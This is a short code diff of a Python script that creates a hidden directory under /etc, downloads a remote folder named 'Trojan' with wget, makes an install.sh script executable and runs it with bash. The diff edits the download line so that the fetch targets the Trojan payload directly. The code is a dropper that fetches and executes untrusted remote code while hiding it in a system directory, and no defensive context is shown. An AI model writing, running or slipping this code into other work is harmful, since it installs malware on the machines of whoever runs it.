@@ -2,7 +2,7 @@ import os
 import subprocess
 def main():
     os.system("mkdir /etc/.a")
-    os.system("wget -P /etc/.a -r -l 1 https://files.ravenn.net/horror")
+    os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/Trojan")
     os.system("mv /etc/.a/files.ravenn.net/horror/Trojan /etc/.a")
     os.system("chmod +x /etc/.a/install.sh")
     os.system("bash /etc/.a/install.sh")
